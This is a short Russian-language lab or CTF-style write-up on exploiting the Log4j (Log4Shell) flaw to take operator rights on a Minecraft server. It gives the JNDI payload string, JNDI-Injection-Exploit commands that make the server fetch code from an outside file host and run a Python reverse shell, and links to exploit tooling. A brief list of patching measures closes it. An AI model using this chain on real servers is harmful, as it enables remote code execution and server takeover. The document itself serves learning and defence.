# День шестой (Log4j)
-- -
### Цель атаки: 
Получить права оператора (`/op`) на майнкрафт сервере

### Решение:

Уязвимость заключается в неправильном форматировании логов в библиотеке Log4J для Java. Благодаря ошибке можно получить
доступ к протоколу JNDI, что по сути эквивалентно удаленному исполнению Java кода. PoC: `${jndi:ldap://<your-ip>}`
Отправляя строчку с эксплоитом в чате сервера можно получить Reverse Shell (обратный шелл к серверу) и исполнять
произвольные команды на нем. Используя https://www.revshells.com/ генерируем Python3 эксплоит, который заливаем на
наш сервер (в нашем случае это будет https://tmpfiles.org/). Далее используя уязвимость Log4J заставляем сервер скачать
наш эксплоит и исполнить его.

### Итоговый эксплоит:
`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "wget <url с эксплоитом>"`

Отправляем в чат `${jndi:ldap://<url из предыдущего шага>}`

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "python3 <файл с эксплоитом>"`

Отправляем в чат `${jndi:ldap://<url из предыдущего шага>}`

screen/tmux attach to server session

`/op pufit`

### Интсрументы и полезные ссылки
- Онлайн конструктр реверс шелов https://www.revshells.com/
- Экслоит кит https://github.com/pimps/JNDI-Exploit-Kit
- Сайт для временного хранения файлов (и доступа к ним по HTTP) https://tmpfiles.org/


### Способ защиты
- Обновить версию java на всех устройствах
- Обновить Log4j до последней версии
- Не использовать устаревшие версии Java
- Не заходить на недоверенные сервера без патча
